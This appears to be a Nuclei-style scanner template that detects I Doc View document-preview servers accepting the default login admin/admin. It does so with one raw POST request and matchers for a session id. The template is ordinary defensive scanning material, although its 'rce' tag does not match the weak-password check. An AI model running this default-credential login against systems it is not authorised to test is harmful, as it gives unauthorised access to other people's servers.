id: poc-idocview-weak-password
info:
  name: I Doc View Online Document Preview Weak Password Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: rce
http:
  - raw:
      - |
        POST /user/login.json HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        user=admin&password=admin
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - '\"sid\":\"[0-9A-Za-z]+\"'
      - type: word
        part: header
        words:
          - "idocv"
      - type: word
        part: header
        words:
          - "application/json"
      - type: word
        part: body
        words:
          - "<"
        negative: true
